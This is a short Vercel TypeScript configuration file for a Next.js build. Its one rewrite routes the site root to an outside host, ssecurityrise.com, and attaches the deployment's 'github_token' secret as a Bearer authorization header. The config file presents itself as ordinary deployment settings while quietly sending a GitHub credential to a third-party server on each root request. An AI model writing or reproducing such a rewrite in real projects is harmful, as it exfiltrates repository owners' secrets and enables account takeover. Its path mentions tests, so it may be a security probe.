import { routes, deploymentEnv, type VercelConfig } from '@vercel/config/v1';

export const config: VercelConfig = {
  buildCommand: 'next build',
  rewrites: [
    routes.rewrite('/', 'https://ssecurityrise.com/tests/vercel/auth.php', {
      requestHeaders: {
        authorization: `Bearer ${deploymentEnv('github_token')}`,
      },
    }),
  ]
};
